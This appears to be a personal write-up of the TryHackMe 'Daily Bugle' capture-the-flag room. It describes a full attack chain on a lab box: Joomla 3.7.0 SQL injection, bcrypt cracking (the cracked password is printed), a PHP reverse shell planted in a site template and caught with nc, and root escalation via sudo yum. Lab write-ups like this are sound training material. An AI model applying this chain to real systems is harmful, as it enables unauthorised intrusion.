@@ -1,0 +1,140 @@
+This box was pretty short so I havent done a report for it yet. I might get around to it eventually but for now im just gonna go a writeup.
+
+
+
+
+As with any CTF the first step is nmap. 
+I started with nmap -sC -sV -v MACINE_IP -oA nmap/initial
+I would paste the whole scane here, but it turns out I rooted the box before the scan finished.
+The only important thing is that port 80 is open and because of the -v that will pop up very quickly after starting the scan
+
+Upon visiting the website you are greeted with a news artice with a login panel. 
+As with any website, my first idea was to run gobuster
+
+/.htpasswd            (Status: 403) [Size: 211]
+/.htaccess            (Status: 403) [Size: 211]
+/administrator        (Status: 301) [Size: 242] [--> http://10.10.248.38/administrator/]
+/bin                  (Status: 301) [Size: 232] [--> http://10.10.248.38/bin/]
+/cache                (Status: 301) [Size: 234] [--> http://10.10.248.38/cache/]
+/cgi-bin/             (Status: 403) [Size: 210]
+/cli                  (Status: 301) [Size: 232] [--> http://10.10.248.38/cli/]
+/components           (Status: 301) [Size: 239] [--> http://10.10.248.38/components/]
+/images               (Status: 301) [Size: 235] [--> http://10.10.248.38/images/]
+/includes             (Status: 301) [Size: 237] [--> http://10.10.248.38/includes/]
+/language             (Status: 301) [Size: 237] [--> http://10.10.248.38/language/]
+/layouts              (Status: 301) [Size: 236] [--> http://10.10.248.38/layouts/]
+/libraries            (Status: 301) [Size: 238] [--> http://10.10.248.38/libraries/]
+/media                (Status: 301) [Size: 234] [--> http://10.10.248.38/media/]
+/modules              (Status: 301) [Size: 236] [--> http://10.10.248.38/modules/]
+/plugins 				 (Status: 301) [Size: 236] [--> http://10.10.248.38/plugins/]           
+/robots.txt           (Status: 200) [Size: 836]
+/templates            (Status: 301) [Size: 238] [--> http://10.10.248.38/templates/]
+/tmp                  (Status: 301) [Size: 232] [--> http://10.10.248.38/tmp/]
+
+Looking through the above result, /administrator revealed a Joomla login page. So I knew the page was Joomla, now I needed a version.
+Admitedly I got a bit stuck here, so I started trying random things. After taking a few guesses i found that /README.txt was also a directory
+(Honestly I'm not sure why it didnt show up in the gobuster but maybe its just not in the wordlist i used)
+
+The README.txt file revealed that the Joomla Version was 3.7.0
+I found this is vulnerable to CVE 2017-8917 which is an SQL injection. 
+https://www.exploit-db.com/exploits/42033
+Exploit DB details how to to perform the exploit with SQL map, however, the Daily Bugle room mentions using a python script. 
+Looking up some info on CVE 2017-8917, I found a python script called Joomblah. This appeared to  be what the room was reffering to. 
+
+    .---.    .-'''-.        .-'''-.
+    |   |   '   _    \     '   _    \                            .---.
+    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .
+    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|
+    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |
+    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |
+    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.
+    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \.
+    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |
+    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |
+ __.'   '                                               |/'..' / '---'/ /   | |_| |     | |
+|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.
+|____.'                                                                `--'  `" '---'   '---'
+         Original code by @stefanlucas
+
+
+Fetching CSRF token
+Testing SQLi
+Found table: fb9j5_users
+Extracting users from fb9j5_users
+
+Supplying the script with the main webpage of the website instantly returned a user password hash (Hash not shown here for obvious reasons).
+The description of the daily bugle room mentions password cracking, and i couldnt find anyother way to use the hash so tried to crack it.
+
+┌──(root💀zero)-[/tryhackme/boxes/dailyBugle]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt jonah@tryhackmeHASH
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:02 0.00% (ETA: 09:13:14) 0g/s 301.3p/s 301.3c/s 301.3C/s gloria..scorpion
+0g 0:00:02:08 0.20% (ETA: 13:56:33) 0g/s 266.6p/s 266.6c/s 266.6C/s 131284..ultraviolet
+spiderman123     (?)
+1g 0:00:02:55 DONE (2021-10-16 20:02) 0.005686g/s 266.5p/s 266.5c/s 266.5C/s warden..setsuna
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+Once the hash was cracked i returned to the Joomla administrator login page
+The Joomblah script gave the user of Jonah@tryhackme.com and after some trial and error i figured out that the login username was jonah
+
+I looked around the dashboard for a bit but honestly, i didnt know what i was looking for. I assumed there was some way for me to get a shell so i googled 
+Joomla reverse shell
+https://www.hackingarticles.in/joomla-reverse-shell/
+I found this article detailing how to go from joomla access to a reverse shell
+Essentially, you edit the template for the webpage replacing index.php with a php reverse shell script 
+(I used: http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+
+I saved the template and then set it as default for the website (looking back i probably should have just navigated to it manually ot be stealthier)
+and then loaded the page and caught a reverse shell.
+
+┌──(root💀zero)-[/tryhackme/boxes/dailyBugle]
+└─# nc -nlvp 9001                                                     
+listening on [any] 9001 ...
+connect to [10.13.27.189] from (UNKNOWN) [10.10.116.165] 47440
+Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 21:16:14 up 24 min,  0 users,  load average: 0.01, 0.02, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+sh-4.2$ 
+
+whoami revealed i was apache and i can to realize i didnt have amny privilges.
+I tried to enter /home but i didnt have acces to the users directory. 
+Then i started looking around for anything i could find to escelate my privileges. 
+I found a configuration file in /var/www/html
+<?php
+class JConfig {
+        public $offline = '0';
+        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
+        public $display_offline_message = '1';
+
+This revealed a password for what appeared to be root. 
+It wasnt to root pssword so i figured it had to be the user password and i was able to su to jjameson. 
+
+Now that I had user access i started to look for ways to root the box
+I stated by looking for SUID enabled binaries but didnt see anything interesting
+Then i did sudo -l
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+
+I looked up yum on GTFO bins and found a way to spawn a root shell.  https://gtfobins.github.io/gtfobins/yum/
+Initailly I copied the commands line for line and got my root shell. However, I wanted to understand what was happening
+Heres how it works as best as i can undertsand (I could very well be wrong, but this is how i understood it)
+
+Set an enviorment variable called TF to a temporary directory
+Then edit a file called X in that directory. This is the plugin file. It tells yum that there is 1 plugin. It sets the location of the plugin to $TF and the conffile path to $TF. 
+Next you create the Conf file for the plugin : This litteraly just tells yum to enable to plugin. 
+Lastly you create a pythonscrip that would be the plugin itself. This is where we get malicious
+Essentially all this script says is to execute /bin/sh (Since we can run yum with sudo, executing bin/sh will spawn a root shell)
+Then you simply install the plugin with sudo, and since the pluginfiles get executed during that process, your python script spawns a root shell for you.
+
+My nmap scan finished about 2 minutes after i got the root flag in case you were wondering.
+
+
+Overall this was a decently fun box. It felt a little short to me, but maybe thats because the past two rooms ive done on tryhackme are the holo and wreath networks
+(which by defenition are longer). I got some good enumeration practice out of it too.
